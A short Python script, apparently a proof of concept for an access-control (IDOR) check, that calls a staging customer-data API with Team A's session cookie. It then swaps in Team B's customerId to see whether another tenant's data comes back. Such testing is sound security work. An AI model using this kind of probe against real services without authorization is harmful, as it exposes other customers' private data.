import requests
import json

def test_customer_endpoint(customer_id, session_cookie):
    url = "https://staging.gearset.com/api/customerData"
    session = requests.Session()
    # Set the session cookie to simulate an authenticated request for Team A
    session.cookies.set('sessionid', session_cookie)
    
    # Make the GET request with the provided customerId
    response = session.get(url, params={'customerId': customer_id})
    
    # Debug information: URL, status code, and content type
    print(f"\n=== Testing customerId: {customer_id} ===")
    print("Request URL:", response.url)
    print("HTTP Status Code:", response.status_code)
    print("Content-Type:", response.headers.get("Content-Type"))
    
    # Attempt to parse and pretty-print JSON, otherwise print the raw response
    try:
        data = response.json()
        print("Response JSON:")
        print(json.dumps(data, indent=4))
    except Exception as e:
        print("Could not parse JSON. Raw response:")
        print(response.text)

if __name__ == "__main__":
    # Replace 'valid_session_cookie_for_TeamA' with your actual session cookie value
    session_cookie = "valid_session_cookie_for_TeamA"
    
    # Test with the legitimate Team A request
    test_customer_endpoint("TeamA", session_cookie)
    
    # Test with the tampered Team B request
    test_customer_endpoint("TeamB", session_cookie)
